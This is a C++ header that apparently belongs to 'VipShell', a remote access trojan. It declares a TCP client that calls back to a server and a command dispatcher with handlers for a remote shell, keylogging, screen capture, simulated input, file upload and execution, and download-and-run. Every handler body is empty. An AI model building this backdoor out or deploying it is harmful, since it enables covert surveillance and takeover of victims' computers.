#pragma once
#include "stdafx.h"
#include ".\vipshellex.h"
class CVipShellCTcpClient : public CTcpClient
{
public:
	int Send(const void* buf, int len, int flags = 0, bool block = true)
	{
		return CTcpClient::Send(buf, len, flags, block);
	}
	int Recv(void* buf, int len, int flags = 0, bool block = true)
	{
		return CTcpClient::Recv(buf, len, flags, block);
	}
	bool ConnectServer(/*CVipShellCTcpClient* pServer, */LPCWSTR szServer, DWORD dwPort)
	{
		char* ip = _GetDnsToAddr(CW2A(szServer));
		Close();
		Create(ntohl(inet_addr(ip)), (u_short)dwPort);
		return IsOpened();
	}
protected:
	char* _GetDnsToAddr(IN const char * str)
	{
		hostent * pHost;
		pHost = (struct hostent *)gethostbyname((const char*)str);
		if(!pHost)
			return NULL;
		hostent& he = *pHost;
		sockaddr_in sa;
		memcpy ( &sa.sin_addr.s_addr, he.h_addr_list[0],he.h_length);
		return inet_ntoa(sa.sin_addr); 
	}
};





class CDefCommandProc /*: public CThreadBase*/
{
public:
	CDefCommandProc();
	~CDefCommandProc(void);
//	virtual void OnNewThread(DWORD dwCreateMarker, DWORD dwThreadId, LPVOID lpParameter);
public:
	void SetBindVipShellCTcpClient(CVipShellCTcpClient* hServer, CVipShellEx* hServerManage);
	void DoCommandProc();
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info){};
	virtual void OnCmd_GetSystemInfo(tagVipShellCmd* info){};
	virtual void OnCmd_GetShell(tagVipShellCmd* info){};
	virtual void OnCmd_GetScreen(tagVipShellCmd* info){};
	virtual void OnCmd_GetFileManage(tagVipShellCmd* info){};
	virtual void OnCmd_GetKeyLog(tagVipShellCmd* info){};
///////////////
	virtual void OnKeyDownd(tagVipShellCmd* info){};
	virtual void OnKeyUp(tagVipShellCmd* info){};
	virtual void OnMouseMove(tagVipShellCmd* info){};
	virtual void OnLButtonDown(tagVipShellCmd* info){};
	virtual void OnLButtonUp(tagVipShellCmd* info){};
	virtual void OnLButtonDblclk(tagVipShellCmd* info){};
	virtual void OnRButtonDown(tagVipShellCmd* info){};
	virtual void OnRButtonUp(tagVipShellCmd* info){};
	virtual void OnRButtonDblclk(tagVipShellCmd* info){};
	virtual void OnKeyCtrlAltDel(tagVipShellCmd* info){};
	virtual void OnGetCap(tagVipShellCmd* info){};

//////FileManage////////////
	virtual void OnFileManageGetRoot(tagVipShellCmd* info){};
	virtual void OnFileManageGetFilePath(tagVipShellCmd* info){};
	virtual void OnFileManageDelFile(tagVipShellCmd* info){};
	virtual void OnFileManageRunFile(tagVipShellCmd* info){};
	virtual void OnFileManageMoveFile(tagVipShellCmd* info){};
	virtual void OnFileManageDownFile(tagVipShellCmd* info){};
	virtual void OnFileManageUpFile(tagVipShellCmd* info){};
	virtual void OnFileManageCreateDir(tagVipShellCmd* info){};

///////////////////////////////////////////////////////////
	virtual void OnCmd_GetProcessList(tagVipShellCmd* info){};
	virtual void OnCmd_KillProcess(tagVipShellCmd* info){};
//////////////////////////////////////////////////////////
	virtual void OnCmd_DownFileRun(tagVipShellCmd* info){};
	virtual void OnCmd_SaveConfig(tagVipShellCmd* info){};
	
protected:
	int _SendBuffData(BYTE* pData, DWORD dwlen);
protected:
	CVipShellEx*  m_hServerManage;
	CVipShellCTcpClient* m_hServer;
};
